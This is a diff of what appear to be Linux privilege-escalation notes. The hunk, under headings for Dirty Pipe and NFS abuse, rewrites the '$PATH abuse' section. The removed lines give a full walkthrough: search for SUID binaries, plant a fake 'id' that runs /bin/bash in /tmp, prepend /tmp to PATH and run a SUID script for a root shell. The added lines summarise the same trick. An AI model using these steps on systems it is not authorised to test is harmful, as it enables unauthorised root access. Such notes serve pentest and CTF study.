@@ -654,22 +654,10 @@ Dirty-Pipe-requireLinux5.8+_CVE-2022-0847.sh
 ```
 ### Abusing $PATH
 ```
-Add /tmp into path
-export PATH=/tmp:$PATH
-ehco $PATH
+1.find a program that runs system command without absolute path
+2. check If current user can write to path under $PATH or use "export PATH=/tmp:$PATH" to add /tmp to $PATH
 
-check If any writable path under $PATH
 
-1. find / -perm -u=s -type f 2>/dev/null
-2. Then we move into /home/raj/script and saw an executable file “shell2”. So we run this file, it looks like the file shell2 is trying to run id and this is a genuine file inside /bin.
-3. cd /tmp
-echo "/bin/bash" > id
-chmod 777 id
-echo $PATH
-export PATH=/tmp:$PATH
-cd /home/raj/script
-./shell2
-whoami
 ```
 ### Abusing NFS
 ```
